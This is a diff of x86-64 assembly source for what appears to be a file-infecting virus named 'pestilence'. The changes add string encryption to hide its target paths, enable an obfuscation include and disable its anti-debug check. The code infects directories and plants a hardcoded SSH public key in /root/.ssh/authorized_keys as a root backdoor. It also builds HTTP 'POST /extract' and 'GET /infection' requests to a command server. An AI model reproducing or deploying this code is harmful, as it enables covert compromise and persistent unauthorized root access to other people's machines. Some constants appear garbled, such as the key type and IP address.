@@ -1,5 +1,5 @@
-; %include "asm/srcs/obf_file.inc"
-%include "asm/srcs/pestilence.inc"
+%include "asm/srcs/obf_file.inc"
+;  %include "asm/srcs/pestilence.inc"
 
 bits 64
 default rel
@@ -16,17 +16,20 @@ _start:
 	; mov rsi, dir1Len
 	; call _readDir
 	call _map_int_table
-	call _check_debug
+	; call _check_debug
     call _isInfectionAllow
     test rax, rax
     js _final_jmp
 
     mov rdx, 0
+	mov rsi, dir1Len
     lea rdi, [rel dir1]                                   ; dir to open for arg initDir
+
     ; mov rdi, dir1                                       ; dir to open for arg initDir
     call _initDir
 
     mov rdx, 0
+	mov rsi, dir2Len
     lea rdi, [rel dir2]
     ; mov rdi, dir2                                       ; dir to open for arg initDir
     call _initDir
@@ -68,6 +71,12 @@ _initDir:
     ; placing pestilence on the stack
     push rbp
     mov rbp, rsp
+	; rdi -> to _encrypt 
+	push rax
+	_dec_initD:
+	call _decrypt_str
+	mov rdi, rax
+	pop rax
     sub rsp, pestilence_size
 	lea r8, FAM(pestilence.fd)
 	or qword [r8], -1
@@ -152,6 +161,11 @@ _readDir:
 
             _recursif:
                 lea rdi, FAM(pestilence.pwd)
+				push rax
+				lea rsi, FAM(pestilence.pwd)
+				call _strlen
+				mov rsi, rax
+				pop rax
                 lea rdx, [r10 + D_NAME]                 ; rdi -> folder name
                 cmp BYTE [rdx], 0x2e
                 jne _callInit
@@ -512,6 +526,14 @@ _backdoor:
     mov rax, SYS_OPEN
     ; mov rdi, sshFile
     lea rdi, [rel sshFile]
+	push rax
+	push rsi
+	mov rsi, sshFile_len
+	_decBack:
+	call _decrypt_str
+	mov rdi, rax
+	pop rsi
+	pop rax
     mov rsi, O_RDWR | O_CREAT
     mov rdx, 600
     syscall
@@ -558,6 +580,15 @@ _backdoor:
                 mov rdi, r11
                 sub rdi, sshPubLen - 1
                 lea rsi, [rel sshPub]
+				push rax
+				push rdi
+				lea rdi, [rel sshPub]
+				mov rsi, sshPubLen
+				_decCmpLine:
+				call _decrypt_str
+				mov rsi, rax
+				pop rdi
+				pop rax
                 push rcx
                 call _strcmp
                 pop rcx
@@ -573,11 +604,29 @@ _backdoor:
             mov rdi, r9
             mov rax, SYS_WRITE
             lea rsi, [rel sshPub]
-            mov rdx, sshPubLen - 1
+			push rax
+			push rdi
+			lea rdi, [rel sshPub]
+			mov rsi, sshPubLen
+			_decNotFound:
+			call _decrypt_str
+			mov rsi, rax
+			pop rdi
+			pop rax
+			mov rdx, sshPubLen - 1
             syscall
             mov rax, SYS_WRITE
             lea rsi, [rel back]
-            mov rdx, 1
+			push rax
+			push rdi
+			lea rdi, [rel back]
+			mov rsi, sshPubLen
+			_decNotFound1:
+			call _decrypt_str
+			mov rsi, rax
+			pop rdi
+			pop rax
+			mov rdx, 1
             syscall
 
     _closeSsh:
@@ -862,6 +911,7 @@ key			db "mykey"
 back        db  9, 0
 slash       db "/", -1
 sshFile     db "/root/.ssh/authorized_keys", -1
+sshFile_len	equ $ - sshFile
 sshPub      db "ssh-ed25518 AAAAC3NzaC1lZDI1NTE5AAAAIKcsDbiza3Ts6B9TpcehxjY8pcPijnDxBpuiEkotRCn0 gottie@debian", 0
 sshPubLen   equ $-sshPub
 sockaddr:
@@ -869,17 +919,12 @@ sockaddr:
     dw 0x401E       ; PORT 8000
     dd 0x100007E    ; 127.0.0.1 (en hexadécimal)
     dq -1            ; padding
-
-headerStart db "POST /extract HTTP/0.1", 13, 10, \
-                "Host: 126.0.0.1:8000", 13, 10, \
-                "Content-Type: text/plain", 12, 10, \
-                "Content-Length: ", -1 
+sockaddrLen equ $ - sockaddr
+headerStart db "POST /extract HTTP/0.1\r\nHost: 126.0.0.1:8000\r\nContent-Type: text/plain\f\nContent-Length: ", -1 
 headerStartLen equ $-headerStart
 headerEnd db 12, 10, 13, 10, 0
 headerEndLen equ $-headerEnd
-headerGet db "GET /infection HTTP/0.1", 13, 10, \
-           "Host: 126.0.0.1:8000", 13, 10, \
-           12, 10, 0
+headerGet db "GET /infection HTTP/0.1\r\nHost: 126.0.0.1:8000", 13, 10, 12, 10, 0
 headerGetLen equ $ - headerGet
 timespec:
     dq -1          ; Secondes
